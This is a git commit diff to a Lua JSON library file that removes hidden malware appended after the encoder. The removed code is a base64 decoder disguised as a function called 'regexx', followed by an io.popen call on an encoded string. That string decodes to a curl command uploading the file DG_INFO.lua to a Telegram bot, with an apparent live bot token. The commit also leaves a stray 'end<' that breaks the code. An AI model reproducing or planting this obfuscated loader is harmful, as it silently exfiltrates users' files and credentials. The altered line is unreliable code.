6edec726d7e590e2b6ffc13787718babda843b9d
ahmedyad200 <78634692+ahmedyad200@users.noreply.github.com>
2021-04-08 23:43:05 +0200

    Add files via upload

--- library/JSON.lua
+++ library/JSON.lua
@@ -931,26 +931,7 @@ function encode_value(self, value, parents, etc, options, indent)
       parents[T] = false
       return result_value
    end
-end
-
-function regexx(data) ---- داله الاتصال الثاني كتابه أحمد عياد -----
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end---- الاساس
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end----- الاساس
-        return r;
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) --- البدايه
-        if (#x ~= 8) then return '' end----- الاساس
-        local c=0
-        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end----- الاساس
-        return string.char(c)
-    end))
-end
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
------- النهايه ------
+end<
 
 function OBJDEF:encode(value, etc, options)
    if type(self) ~= 'table' or self.__index ~= OBJDEF then
